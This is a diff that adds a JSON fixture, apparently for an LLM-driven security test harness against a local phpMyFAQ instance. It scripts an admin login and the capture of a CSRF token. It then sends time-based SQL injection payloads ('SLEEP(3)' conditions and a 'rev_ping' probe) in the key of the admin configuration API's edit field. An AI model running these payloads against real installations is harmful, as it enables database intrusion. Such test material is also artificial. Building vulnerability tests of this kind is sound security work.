@@ -1,0 +1,83 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3300",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_admin_login",
+          "method": "GET",
+          "url": "/admin/index.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_admin",
+          "method": "POST",
+          "url": "/admin/index.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "faqusername": "<admin_user>",
+            "faqpassword": "<admin_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "open_configuration_page",
+          "method": "GET",
+          "url": "/admin/index.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "action": "config"
+          },
+          "body": {},
+          "extract": {
+            "pmf_csrf_token": "HTML element with id='pmf-csrf-token', attribute 'value'"
+          }
+        },
+        {
+          "step": 4,
+          "name": "sqli_configuration_key",
+          "method": "POST",
+          "url": "/admin/api/configuration",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "pmf-csrf-token": "<pmf_csrf_token>",
+            "edit[<edit_key_payload>]": "1"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "edit_key_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "edit_key_payload": [
+        "main.titleFAQ",
+        "x' OR IF(1=1,SLEEP(3),0)='1",
+        "x' OR (SELECT SLEEP(3))='1",
+        "x' OR rev_ping('phpmyfaq0')='__nomatch__"
+      ]
+    }
+  }
+]
